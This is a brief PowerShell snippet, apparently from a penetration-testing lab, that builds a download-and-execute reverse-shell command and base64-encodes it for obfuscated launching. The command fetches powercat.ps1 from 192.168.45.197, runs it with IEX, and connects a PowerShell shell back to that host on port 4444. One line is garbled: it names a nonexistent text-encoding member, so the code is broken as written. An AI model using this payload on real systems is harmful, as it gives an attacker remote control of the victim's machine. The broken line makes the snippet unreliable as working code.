$Text =  "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.197/powercat.ps1');powercat -c 192.168.45.197 -p 4444 -e powershell"
$Bytes = [System.Text.Encoding]::blackmarlinexec.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText
